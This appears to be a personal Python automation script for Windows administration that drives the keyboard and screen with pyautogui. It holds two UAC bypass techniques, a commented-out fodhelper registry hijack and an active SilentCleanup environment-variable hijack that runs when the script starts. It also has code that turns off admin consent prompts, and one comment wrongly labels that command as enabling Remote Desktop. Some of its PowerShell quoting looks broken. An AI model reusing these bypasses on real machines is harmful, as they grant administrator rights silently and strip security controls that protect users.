import pyautogui as pag
import time
import sys
import subprocess

#***requires pip install opencv_python***#

#****USEFUL POWERSHELL COMMANDS****#

#*Change User Account Control Settings to Min* --> *Run Prog* --> *UAC Back To Default Level*#

# |command to restart computer: Restart-Computer
# |command to restart multiple computers: Restart-Computer -ComputerName SHELL-PC01, SHELL-PC02, localhost
# |command to run powershell as admin: runas /netonly /user:RemoteDomain\Administrator powershell
# |command to disable remote desktop: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 1
# |command to disable remote desktop through firewall: Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
# |command to enable remote desktop: Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
# |command to enable remote desktop through firewall: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
# |
# |
# |
# |
# |
# |
# |
# |
# |


queryList = []

def searchFunc(arg):
    pag.press('win')
    time.sleep(1)
    pag.write(arg)
    time.sleep(0.5)

def launchFileExplorer():
    pag.hotkey("win","E")

def enableRemoteDesktopSettings():
    pag.write('''reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
''')

def cmdAdmin():
    searchFunc("cmd")
    pag.hotkey("ctrl","shift","enter")
    pag.locateOnScreen('C:/Users/Blake/Desktop/bttn.png')
    pag.press("left")
    pag.press("enter")
    

def setTimeDate():
    time.sleep(0.5)
    cmdAdmin()
    pag.hotkey("win","up")
    time.sleep(0.5)
    pag.write('tzutil /s "Central Standard Time"')
    time.sleep(1)
    pag.press("enter")

def setRemoteDesktopSettings():
    cmdAdmin()
    enableRemoteDesktopSettings()

def disableUAC():
    searchFunc("UAC")
    pag.press("enter")
    time.sleep(0.5)
    uac = pag.locateOnScreen('C:\\Users\\Blake\\Desktop\\uac.png', grayscale=True,confidence=.5)
    time.sleep(1)
    print(uac)
    pag.click()

# def uacBypass():

#     subprocess.call('powershell -command " New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force"', shell=True) 
#     subprocess.call('powershell -command "New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force"', shell=True)
#     subprocess.call('powershell -command "Cmd = fodhelper "', shell=True)
#     subprocess.call('powershell -command "Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Force"',shell=True)
#     setRemoteDesktopSettings()
#     # subprocess.call('powershell -command "Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0"', shell=True)
        
# uacBypass()

def uacBypass():

    subprocess.call('powershell -command "if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Force} else { $registryPath = "HKCU:\Environment"$Name = "windir"$Value = "powershell -ep bypass -w h $PSCommandPath;#"Set-ItemProperty -Path $registryPath -Name $name -Value $Value schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null Remove-ItemProperty -Path $registryPath -Name $name}"')

uacBypass()


# p = subprocess.Popen(["powershell.exe", 
#               "C:\\Users\\USER\\Desktop\\helloworld.ps1"], 
#               stdout=sys.stdout)
# p.communicate()


#List of possible searches: OS, cmd, date and time settings, notifications and settings, check for updates
#List of dicoverable terms: OS Version = qualification version, 
